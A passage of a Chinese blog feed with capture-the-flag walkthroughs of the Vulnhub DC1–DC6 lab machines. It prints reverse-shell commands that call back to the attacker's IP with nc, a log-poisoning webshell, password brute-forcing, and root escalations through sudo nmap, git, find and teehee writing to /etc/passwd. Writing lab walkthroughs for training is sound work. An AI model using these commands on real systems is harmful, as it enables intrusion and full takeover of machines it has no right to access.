src="/dc7/053017.png" class="">     <p>反弹shell写入成功。等定时任务执行即可自动连接。    </p><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a><strong>提权</strong></h1><p>连接成功。得到flag。    </p><img src="/dc7/053018.png" class="">]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub系列之DC6靶场详解</title>
      <link href="/dc6/"/>
      <url>/dc6/</url>
      
        <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><ol><li>vulhub系列之DC6靶场</li><li>VMware虚拟机</li><li>kali  </li></ol><h1 id="爆破拿后台密码"><a href="#爆破拿后台密码" class="headerlink" title="爆破拿后台密码"></a><strong>爆破拿后台密码</strong></h1><p>根据目标靶机MAC地址得到目标IP：192.168.43.60，直接上nmap扫描。   </p><img src="/dc6/052702.png" class="">   <p>开启了22和80两个端口号，并且需要指定域名解析才可以访问网页，直接在<code>/etc/hosts</code>下写入<code>192.168.43.60 wordy</code>即可。</p><img src="/dc6/052703.png" class="">    <p>进入网站可以知道CMS为wordpress 5.1.1,直接wpscan扫描。   </p><img src="/dc6/052704.png" class="">    <p>扫描出5个用户，把五个用户写入user.txt中，用wpscan进行密码爆破，密码用kali自带的（路径为/usr/share/wordlists/rockyou.txt)(官网给出了提示可以少花点时间爆破：<code>cat /usr/share/wordlists/rockyou.txt |grep k01&gt;password.txt</code>)    </p><img src="/dc6/052705.png" class="">    <p>爆破出一组密码mark/helpdesk01。<br>wordpress默认后台登陆路径为wp-admin。直接登陆。    </p><h1 id="命令执行拿shell"><a href="#命令执行拿shell" class="headerlink" title="命令执行拿shell"></a><strong>命令执行拿shell</strong></h1><img src="/dc6/052706.png" class="">   <p>在后台找突破点，最终在activity monitor插件中找到lookup可以进行域名解析，尝试进行拼接命令执行。   </p><img src="/dc6/052707.png" class="">    <p>发现可以进行命令执行，但是长度有限制，所以直接抓包反弹shell。   </p><img src="/dc6/052708.png" class="">     <p>反弹成功。   </p><h1 id="sudo切换用户"><a href="#sudo切换用户" class="headerlink" title="sudo切换用户"></a><strong>sudo切换用户</strong></h1><img src="/dc6/052709.png" class="">    <p>在/home/mark/stuff中发现graham密码，直接ssh连接。   </p> <img src="/dc6/052710.png" class="">    <p> 发现/home/jens/backups.sh不需要密码即可执行。于是写入反弹shell命令<code>nc -e /bin/bash 192.168.43.173 6666</code>，执行backups.sh即可得到jens的shell。   </p><h1 id="nmap脚本提权拿root权限"><a href="#nmap脚本提权拿root权限" class="headerlink" title="nmap脚本提权拿root权限"></a><strong>nmap脚本提权拿root权限</strong></h1>  <img src="/dc6/052711.png" class="">     <p>发现nmap不需要密码即可root权限执行。nmap的–script参数可以执行脚本，脚本是用lua语言写的。   </p><p>进入/tmp目录执行命令：</p><pre class="line-numbers language-none"><code class="language-none">echo 'os.execute("/bin/bash")'&gt;getroot.shsudo nmap --script=getroot.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>提权成功   </p><img src="/dc6/052712.png" class=""><p>拿到flag。</p>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub系列之DC5靶场详解</title>
      <link href="/dc5/"/>
      <url>/dc5/</url>
      
        <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><ol><li>vulhub系列之DC5靶场</li><li>VMware虚拟机</li><li>kali  </li></ol><h1 id="文件包含突破点"><a href="#文件包含突破点" class="headerlink" title="文件包含突破点"></a><strong>文件包含突破点</strong></h1><p>根据目标靶机MAC地址得到靶机IP为192.168.43.160，直接上nmap扫描。    </p><img src="/dc5/051101.png" class="">    <p>发现开放了80、111、36936端口，暂时只知道端口80是web站点，另外两个端口未知。其他无头绪，直接访问网页。   </p><img src="/dc5/051102.png" class="">     <p>进入网页，一堆的英文，看了一下内容发现没有什么用，只有Contact页面有几个输入点，经过SQL注入和XSS测试，没有发现相关漏洞。<br>卡了半天没有找到什么突破点了，所以尝试爆破目标网站的目录看是否有没发现的页面。用kaili自带目录爆破工具dirbuster。<br>命令行输入</p><pre class="line-numbers language-none"><code class="language-none">dirbuster -u http://192.168.43.160<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>输入命令后会自动进入软件页面。默认字典在<code>/usr/share/dirbuster/wordlists</code>目录下。     </p><img src="/dc5/051103.png" class="">    <p>该目录下有几个字典，先选择小字典进行爆破，没有结果就进行选择其他字典爆破。    </p><img src="/dc5/051104.png" class="">   <p>爆破结果发现了footer.php目录。    </p><img src="/dc5/051105.png" class="">   <p>进入footer.php目录发现只有几个字符，但是每次刷新页面后面的年份都会变，想到了之前页面下也有类似的字符。    </p><img src="/dc5/051106.png" class="">    <p>经过寻找发现只有thankyou.php下面的字符年份页面刷新会变，其他页面的年份不会变，所以想到在thankyou.php页面下存在文件包含。    </p><img src="/dc5/051107.png" class="">    <p>经过几个常见文件包含的参数测试，发现文件包含的参数是file,并且可以访问包含页面。(可以用参数字典进行爆破寻找，毕竟真实环境中参数不会那么简单)    </p><img src="/dc5/051108.png" class="">  <p>发现不用绕过就可以直接访问根目录下的文件，但是访问/etc/passwd文件没有收获，其他目录下也没有收获。<br>这时想到了从前面可以知道这是一个nginx站点，nginx日志默认字典路径为/var/log/nginx/access.log。所以想到了通过日志文件写入小马再通过菜刀连接。</p><img src="/dc5/051111.png" class="">    <p>抓包写入php小马。    </p><img src="/dc5/051112.png" class="">     <p>访问日志，发现成功写入小马。(由于之前进行目录爆破导致日志文件加载有点慢)    </p><img src="/dc5/051113.png" class="">  <p>连接成功。<br>反弹shell到kali上。 </p><h1 id="screen提权"><a href="#screen提权" class="headerlink" title="screen提权"></a><strong>screen提权</strong></h1><img src="/dc5/051301.png" class="">    <p>查看是否有提权的突破点，发现有个/bin/screen-4.5.0具有root权限。因为直接告诉我们版本了，所以直接去漏洞库查看是否有可利用的脚本。  </p><img src="/dc5/051302.png" class="">    <p>发现有本地提权的利用脚本，打开41154.sh文件查看。  </p><img src="/dc5/051303.png" class="">    <p>查看文件可以知道，脚本文件需要分成3个步骤完成。</p><p>第一步：将第一部分代码写入libhax.c文件中，再执行相应命令生成libhax.so文件。最后删除libhax.c文件。</p><img src="/dc5/051304.png" class="">    <p>第二步：将第二部分的代码写入rootshell.c文件并执行命令生成rootshell文件，最后删除rootshell.c文件。   </p><img src="/dc5/051305.png" class="">    <p>第三步：将最后一部分代码写入dc5.sh文件中。需要注意的是，需要在文件开头写入<code>#!/bin/bash</code>表示执行环境。最后保存是需要输入<code>:set ff=unix</code>是为了防止脚本的格式错误。    </p><img src="/dc5/051307.png" class="">    <img src="/dc5/051306.png" class="">   <p>完成3个步骤后之间把三个文件上传至靶机的/tmp文件下，然后执行./dc5即可提权。   </p><img src="/dc5/051308.png" class="">     <p>我是用<code>scp</code>命令直接将kali中的文件夹复制到目标靶机上的。复制成功进入文件夹。记得需要给dc5.sh脚本赋予权限。  </p><img src="/dc5/051309.png" class="">   <p>得到flag.</p>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub系列之DC4靶场详解</title>
      <link href="/dc4/"/>
      <url>/dc4/</url>
      
        <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><ol><li>vulhub系列之DC4靶场</li><li>VMware虚拟机</li><li>kali</li></ol><h1 id="爆破网站管理员用户拿shell"><a href="#爆破网站管理员用户拿shell" class="headerlink" title="爆破网站管理员用户拿shell"></a><strong>爆破网站管理员用户拿shell</strong></h1><img src="/dc4/050901.png" class="">   <p>由目标靶机的Mac地址可以得出靶机IP为｀192.168.43.140｀．nmap扫描结果得知目标靶机开放了80端口和22端口，所以只能从目标网站下手。直接进入网首页。    </p><img src="/dc4/050902.png" class="">    <p>根据首页信息可以知道，有admin用户，所以直接用burpsuite爆破，用软件自带密码即可。   </p><img src="/dc4/050903.png" class="">   <img src="/dc4/050904.png" class="">     <p>爆破成功，密码是happy。登陆进去发现是命令执行，所以直接抓包改数据，反弹shell。</p><img src="/dc4/050905.png" class="">   <img src="/dc4/050906.png" class="">   <p>反弹shell成功，是用nc反弹成功的，bash我没有反弹成功，不知道是哪里出问题了。反弹shell命令为：</p><pre class="line-numbers language-none"><code class="language-none">nc -e /bin/bash 192.168.43.173 12345<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>并且在得到的shll用<code>python -c 'import pty;pty.spawn("/bin/bash")'</code>反弹一个完整shll。接下来就是一顿文件查看。看看有没有什么可以利用的信息。    </p><h1 id="SSH爆破密码"><a href="#SSH爆破密码" class="headerlink" title="SSH爆破密码"></a><strong>SSH爆破密码</strong></h1><img src="/dc4/050907.png" class=""><p>最终在/home/jim/backups目录下找到了一份密码文件，所以直接用这份密码文件ssh爆破jim。</p><img src="/dc4/050908.png" class="">    <p>爆破成功，jim/jibril04直接ssh连接。  </p><img src="/dc4/050909.png" class="">  <p>查看mbox,可以看出这是一个邮箱信息，所以查看邮箱内容(邮箱默认路径为/var/mail)   </p><img src="/dc4/050910.png" class="">    <p>邮箱内容是charles发的，并且告诉了密码，所以直接su切换charles。   </p><img src="/dc4/050911.png" class="">    <h1 id="teehee提权"><a href="#teehee提权" class="headerlink" title="teehee提权"></a><strong>teehee提权</strong></h1><p>进入charles，查看是否有什么提示信息。没发现可以用的信息。所以看看有不有可以提权的利用点，输入命令<code>sudo -l</code>后发现teehee不需要命令就可以执行root权限。于是查看teehee的帮助信息。   </p><img src="/dc4/050913.png" class="">    <p>发现teehee的<code>-a</code>参数可以在文件后面加入内容，所以想到可以在/etc/passwd文件加入具有root权限的自定义用户名，并且可以不设置密码。所以根据/etc/passwd文件下的内容格式自定义用户。<br>/etc/passwd文件下的用户格式为：<br><code>用户名:密码占位符:用户id:组id:备注信息:家目录:命令执行环境</code><br>当密码占位符为空时，用户没有密码。</p><p>执行命令：</p><pre class="line-numbers language-none"><code class="language-none">echo 'admin::0:0::/home/admin:/bin/bash' |sudo teehee -a /etc/passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/dc4/050915.png" class="">   <p>直接切换自定义用户，提权成功。    </p><img src="/dc4/050916.png" class="">    <p>加入/root下拿到flag.</p>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub系列之DC3靶场详解</title>
      <link href="/dc3/"/>
      <url>/dc3/</url>
      
        <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a><strong>环境</strong></h1><ol><li>DC-3靶场</li><li>VMware虚拟机</li><li>kali</li></ol><h1 id="flag"><a href="#flag" class="headerlink" title="flag"></a><strong>flag</strong></h1><p>只能从VM虚拟机得到目标靶场的MAC地址，从而得到目标靶场的IP地址，即192.168.43.50.直接上nmap进行扫描。</p><img src="/dc3/050701.png" class=""><p>由nmap结果可以知道，目标靶场只开放了80端口。所以直接访问网页。</p><img src="/dc3/050702.png" class=""><p>根据提示只有一个flag，并且需要拿到root权限才能得到。并且可以知道网站的CMS系统是Joomla。kali自带Joomla的扫描命令即Joomscan.</p><pre class="line-numbers language-none"><code class="language-none">joomscan -u 192.168.43.50<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/dc3/050703.png" class="">   <p>从扫描结果可以得到Joomla版本为3.7.0，并且可以扫描出一下网站目录。<br>直接在漏洞库搜索是否有可利用漏洞。   </p>   <img src="/dc3/050705.png" class="">    <p>发现两个可利用漏洞，一个sql注入，一个XSS，所以SQL注入比较合适，直接查看漏洞利用文本。(漏洞默认路径为/usr/share/exploitdb/exploits/给出的路径)<br>根据利用文本给出的sqlmap利用方式直接上工具sqlmap。</p><img src="/dc3/050706.png" class="">    <img src="/dc3/050707.png" class=""><p>利用成功，爆出5个数据库，继续爆破joomladb中的表、字段。可以爆出表#__users,爆出字段username，password.</p><img src="/dc3/050708.png" class=""><p>需要对密码继续解密，将密码复制到新建文件pd.txt中，执行下面命令解密：</p><pre class="line-numbers language-none"><code class="language-none">john pd.txt --wordlist=/usr/share/wordlist/rockyou.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/dc3/050709.png" class=""><p>因为之前已经解密过，所以需要额外加一个命令看结果，之前没有解密过的可以直接出答案。解密结果为snoopy。</p><img src="/dc3/050710.png" class=""><p>成功登陆进去。<br>其他思路没有，所以只能查看网页内容，在首页Templates下发现了线索  </p><img src="/dc3/050714.png" class="">   <img src="/dc3/050715.png" class="">   <p>进入protostar模块在index.php写入一句话木马，直接<code>蚁剑</code>连接。  </p><img src="/dc3/050716.png" class="">    <p>连接成功。查看文件内容，没有什么发现，直接在进入交互模式。</p><img src="/dc3/050717.png" class="">       <p>没发现什么办法提权，所以只能看看可不可以内核版本提权，所以漏洞库搜索看看有没有相关漏洞利用。</p><img src="/dc3/050718.png" class="">     <p>发现可以提权的漏洞利用，查看利用方式。</p><img src="/dc3/050719.png" class="">  <p>需要下载利用工具，最后一行给出了<a href="https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip">下载地址</a>(国内网络可能下载不了)。</p><img src="/dc3/050801.png" class="">   <p>下载完成，有两个压缩包，通过<code>蚁剑</code>将这’._exploit.tar’上传至靶机即可。解压———执行compile.sh——执行doubleput——提权成功。<br>成功拿到flag.</p>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub系列之DC2靶场详解</title>
      <link href="/dc2/"/>
      <url>/dc2/</url>
      
        <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><ol><li>DC-2靶场</li><li>VMware虚拟机</li><li>kali</li></ol><h1 id="直接更改域名解析进网站拿flag1"><a href="#直接更改域名解析进网站拿flag1" class="headerlink" title="直接更改域名解析进网站拿flag1"></a><strong>直接更改域名解析进网站拿flag1</strong></h1><p>根据目标靶场的MAC地址得出IP为：192.168.31.182，直接上<code>nmap</code>扫描。</p><img src="/dc2/050501.png" class=""><p>可以发现开放了80端口，网页服务器但是可以看出做了域名解析，所以需要在本地即kali的配置文件**/etc/hosts<strong>文件写入<code>192.168.31.182   dc-2</code>即可完成本地域名解析。还可以看出网站是由</strong>WordPress**内容管理系统搭建的。<br>还开放了7744端口，可以知道使用协议是ssh，所以可以远程连接。</p><img src="/dc2/050502.png" class=""><p>直接访问网站可以找到flag1</p><h1 id="爆破用户进后台拿flag2"><a href="#爆破用户进后台拿flag2" class="headerlink" title="爆破用户进后台拿flag2"></a><strong>爆破用户进后台拿flag2</strong></h1><p>查看flag1中的内容，<code>cewl</code>是一个网页关键字抓取工具，<code>WordPress</code>有一个kali自带扫描工具<strong>wpscan</strong>可以爆破网站的用户名，所以想到了用关键字作为密码继续进行爆破。</p><p><code>wpscan --url dc-2 -e u</code>可以查看网站用户，得出结果有三个用户<strong>admin</strong>,<strong>jerry</strong>,<strong>tom</strong>,将这三个用户保存在us.txt文件中</p><p><code>cewl dc-2 -w pds.txt</code>将网站首页下的关键词生成密码字典pds.txt.</p><p><code>wpscan --url dc-2 -U us.txt -P pds.txt</code>爆破口令。</p><img src="/dc2/050504.png" class=""><p>爆破出两个口令。<code>WordPrss</code>默认后台路径为<strong>wp-admin</strong>.登陆jerry/adipiscing直接发现flag2.</p><img src="/dc2/050505.png" class=""><h1 id="登陆ssh-绕过rbash限制拿flag3"><a href="#登陆ssh-绕过rbash限制拿flag3" class="headerlink" title="登陆ssh,绕过rbash限制拿flag3"></a><strong>登陆ssh,绕过rbash限制拿flag3</strong></h1><p>根据提示不能从<code>WordPrss</code>上面找到捷径，登陆tom也没有发现什么，这是时想到了还有7744端口，因为它是ssh协议所以直接尝试ssh连接。由于端口号不是22，所以需要用<code>-p 7744</code>指定端口号。</p><img src="/dc2/050506.png" class=""><p>果不其然，tom登陆成功。查看tom用户下的文件看看有不有什么发现。</p><img src="/dc2/050507.png" class=""><p>虽然发现了flag3.txt，但是读取不了，受到<a href="https://www.freebuf.com/articles/system/188989.html"><code>rbash</code>环境</a>的限制，需要绕过<code>rbash</code>限制。(查看<a href="https://blog.csdn.net/weixin_43705814/article/details/111879362">大佬的博客</a>搞定的，之前没接触过，哎，小白一匹)<br>执行以下命令进行绕过</p><pre class="line-numbers language-none"><code class="language-none">BASH_CMDS[a]=/bin/sh;a  注：把/bin/bash给a变量`export PATH=$PATH:/bin/    注：将/bin 作为PATH环境变量导出export PATH=$PATH:/usr/bin   注：将/usr/bin作为PATH环境变量导出<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><img src="/dc2/050508.png" class=""><p>成功拿到flag3.</p><h1 id="su切换用户拿flag4"><a href="#su切换用户拿flag4" class="headerlink" title="su切换用户拿flag4"></a><strong>su切换用户拿flag4</strong></h1><p>根据flag3的提示需要<code>su jerry</code>。</p><img src="/dc2/050509.png" class=""><p>直接在jerry根目录下拿到flag4.</p><h1 id="git提权拿final-flag"><a href="#git提权拿final-flag" class="headerlink" title="git提权拿final-flag"></a><strong>git提权拿final-flag</strong></h1><p>根据提示需要拿到root权限<br>执行命令<code>sudo -l</code>发现git不需要命令具有root权限执行。于是强制进入git交互模式。输入命令</p><pre class="line-numbers language-none"><code class="language-none">sudo git help config!/bin/bash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><img src="/dc2/050510.png" class=""><p>提权成功拿到final-flag.txt.</p>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub系列之DC1靶场详解</title>
      <link href="/dc1/"/>
      <url>/dc1/</url>
      
        <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><ol><li>DC-1靶场</li><li>VMware虚拟机</li><li>kali</li></ol><h1 id="drupal-7-x漏洞拿flag1"><a href="#drupal-7-x漏洞拿flag1" class="headerlink" title="drupal 7.x漏洞拿flag1"></a><strong>drupal 7.x漏洞拿flag1</strong></h1><p>首先搭建好靶场。这次一次黑盒靶场测试，只能从虚拟机中查看DC1靶场的mac地址，从而查出目标靶机的IP。</p><img src="/dc1/050401.png" class=""><img src="/dc1/050402.png" class=""><p>所以目标IP地址为192.168.31.184，直接上nmap进行目标全面扫描。</p><img src="/dc1/050403.png" class=""><p>由nmap扫描可以知道，目标靶机开放了22,80,111,42875端口，看到端口号22想到ssh远程连接，端口号80想到web网页攻击。后面两个端口暂时想不到有什么用，所以先放在一般后面可能会用到。所以直接访问网页。</p><img src="/dc1/050405.png" class=""><p>由网页可以明显看出本站是由使用<code>PHP</code>语言编写的开源内容管理系统<code>Drupal</code>搭建的，并且由<code>Wappalyzer</code>得知版本为7.X，所以直接使用<code>searchsploit</code>命令在漏洞库中搜索此版本是否有漏洞可以利用。</p><img src="/dc1/050407.png" class=""><p>可以看到由许多可以利用的漏洞，所以我们选择最后一个远程代码执行漏洞，因为这个漏洞可以利用漏洞攻击神奇<code>metasploit</code>进行攻击。</p><img src="/dc1/050408.png" class=""><p>直接使用模块，使用命令<code>info</code>可以查看漏洞的相关信息，也可以查看攻击模块需要设置的参数。根据要求设置参数。</p><img src="/dc1/050409.png" class=""><p>根据要求只需要设置<code>RHOSTS</code>即目标靶场的IP，设置完成执行<code>run</code>命令即可进入<code>shell</code>环境。</p><img src="/dc1/050410.png" class=""><p>由于得到的不是一个完整的<code>shell</code>环境，所以我们所以<code>pyhton</code>中的<code>pty</code>模块反弹一个完整的<code>shell</code>环境,即直接输入</p><pre class="line-numbers language-none"><code class="language-none">python -c 'import pty;pty.spawn("/bin/bash")'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>直接上命令，可以得到flag1</p><h1 id="在目录中找配置文件拿flag2"><a href="#在目录中找配置文件拿flag2" class="headerlink" title="在目录中找配置文件拿flag2"></a><strong>在目录中找配置文件拿flag2</strong></h1><p>根据flag1.txt中的’Every good CMS needs a config file - and so do you.’（意思差不多：每个好的内容管理系统都需要一个配置文件，所以你应该怎么做）提示，所以直接从实名命令执行得到的目录里面找配置文件。</p><img src="/dc1/050412.png" class=""><p>最终在<code>sites/default/default.setting.php</code>中找到的(不要问我怎么找到的，问就是不知道)(觉得可疑的目录和文件就一个一个试呗)<br>于是得到了flag2</p><h1 id="改密码进网站拿flag2"><a href="#改密码进网站拿flag2" class="headerlink" title="改密码进网站拿flag2"></a><strong>改密码进网站拿flag2</strong></h1><p>根据flag2提示(提示内容大概意思是：爆破和目录扫描并不是唯一获得后台的方法(并且你需要访问权限)，下面这些认证信息你怎么使用)。<br>给出的是数据库的相关信息，所以我们直接本地登陆数据库。</p><img src="/dc1/050415.png" class=""><p>查看表users中的内容可以知道用户名和密码。</p><img src="/dc1/050416.png" class=""><p>但是一般加盐的密码是很难破解的，所以选择修改用户密码来解决。首先生成自定密码的加盐哈希值。回到网站的目录下执行<code>php scripts/password-hash.sh 密码</code>命令生成。</p><img src="/dc1/050420.png" class=""><p>修改密码，并且确认是否修改完成</p><img src="/dc1/050421.png" class=""><p>修改完成回到网页登陆，登陆成功</p><img src="/dc1/050422.png" class=""><img src="/dc1/050423.png" class=""><p>得到flag3</p><h1 id="ssh爆破拿flag4"><a href="#ssh爆破拿flag4" class="headerlink" title="ssh爆破拿flag4"></a><strong>ssh爆破拿flag4</strong></h1><p>从flag3中提示发现<code>passwd</code>,<code>shadow</code>所以查看根目录/etc下的这两个文件；</p><img src="/dc1/050424.png" class=""><p><strong>/etc/shadow</strong>无法查看，权限不够，查看<strong>etc/passwd</strong>，发现目标靶机用户flag4,并且有/bin/bash，看到这想到了还有端口22，所以ssh连接。但是密码不知道所以只能用爆破神器<code>hydra</code>。<br>用kali自带密码字典，路径为**/usr/share/john/password.lst**,kali自带各种密码默认保存在**/usr/share/**下。</p><img src="/dc1/050425.png" class=""><img src="/dc1/050426.png" class=""><p>爆出结果为’orange’，所以直接ssh连接，进入家目录查看发现flag4.</p><img src="/dc1/050427.png" class=""><h1 id="提权拿最后的flag"><a href="#提权拿最后的flag" class="headerlink" title="提权拿最后的flag"></a><strong>提权拿最后的flag</strong></h1><p>根据提示需要得到root权限才能得到falg。</p><p>liunx提权一般有四种提权方式：</p><ol><li>sudo提权，通过命令<code>sudo -l</code>查看是否有可提权的命令。</li><li>suid提权，通过命令<code>find / -perm -4000 2&gt;/dev/null</code>查看是否具有root权限的命令</li><li>系统版本内核提权。</li><li>通过数据库提权。</li></ol><img src="/dc1/050428.png" class=""><p>发现<em>find</em>具有root权限。(哪些可以进行提权可以在网上查，提权用法可以临时查)<br>直接执行命令<code>find -exec /bin/sh \;</code>进行提权</p><img src="/dc1/050431.png" class=""><p>提权完成，拿到最后的thefinalflag.txt.</p>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
